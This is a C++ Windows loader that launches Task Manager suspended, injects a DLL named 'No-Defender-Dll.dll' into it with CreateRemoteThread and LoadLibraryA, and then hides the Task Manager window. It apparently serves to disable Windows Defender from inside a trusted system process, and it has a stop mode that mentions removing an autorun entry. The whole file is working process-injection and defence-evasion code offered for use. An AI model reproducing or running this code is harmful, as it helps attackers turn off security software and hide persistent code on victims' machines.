#include <Windows.h>
#include <iostream>
#include <string>

void inject_dll(HANDLE process, const std::string& dll_path) {
    LPVOID remote_mem = VirtualAllocEx(process,nullptr,dll_path.size() + 1,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remote_mem) {
        std::cout << "VirtualAllocEx failed\n";
        return;
    }

    WriteProcessMemory(
        process,
        remote_mem,
        dll_path.c_str(),
        dll_path.size() + 1,
        nullptr
    );

    LPVOID load_library = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    HANDLE thread = CreateRemoteThread(
        process,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)load_library,
        remote_mem,
        0,
        nullptr
    );
    if (!thread) {
        std::cout << "CreateRemoteThread failed\n";
        VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
        return;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
    std::cout << "DLL injected\n";
}


int main(int argc, char* argv[]) {
    bool stop_mode = false;
    if (argc > 1 && std::string(argv[1]) == "--stop") {
        stop_mode = true;
        std::cout << "Stop mode — will unregister and remove autorun\n";
    }

    char dll_path[MAX_PATH];
    GetFullPathNameA("No-Defender-Dll.dll", MAX_PATH, dll_path, nullptr);
    std::cout << "DLL path: " << dll_path << "\n";

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    BOOL ok = CreateProcessA(
        "C:\\Windows\\System32\\Taskmgr.exe",
        nullptr, nullptr, nullptr,
        FALSE,
        CREATE_SUSPENDED,
        nullptr, nullptr,
        &si, &pi
    );
    if (!ok) {
        std::cout << "CreateProcess failed: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "Taskmgr spawned, PID: " << pi.dwProcessId << "\n";
    ResumeThread(pi.hThread);
    Sleep(3000);

    if (stop_mode) {
        HMODULE local_dll = LoadLibraryA(dll_path);
        if (local_dll) {
            FARPROC fn = GetProcAddress(local_dll, "set_stop_mode");
            if (fn) {
                uintptr_t offset = (uintptr_t)fn - (uintptr_t)local_dll;

                inject_dll(pi.hProcess, dll_path);
                Sleep(1000);
            }
            FreeLibrary(local_dll);
        }
    }

    inject_dll(pi.hProcess, dll_path);

    if (!stop_mode) {
        ShowWindow(FindWindow(nullptr, L"Task Manager"), SW_HIDE);
        std::cout << "Running. Taskmgr kept alive.\n";
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
